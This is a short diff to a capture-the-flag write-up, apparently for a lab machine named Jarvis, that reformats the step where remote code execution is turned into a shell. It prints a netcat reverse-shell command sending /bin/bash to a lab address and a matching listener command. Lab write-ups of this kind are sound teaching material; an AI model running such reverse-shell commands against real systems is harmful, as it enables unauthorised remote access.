@@ -134,8 +134,10 @@ ________________________________________________________________________________
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2005-04-04.png)  
 
 #### we've got RCE. but, we can get shell with netcat. Our parameter is "Dark0" after the equal, we can writing commands. 
+``nc -e /bin/bash 10.10.14.50 1337`` 
 
-``nc -e /bin/bash 10.10.14.50 1337`` and your terminal ``nc -nlvp 1337``
+### And nc listen in my terminal 
+``nc -nlvp 1337``
 
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/RCE.png)
 
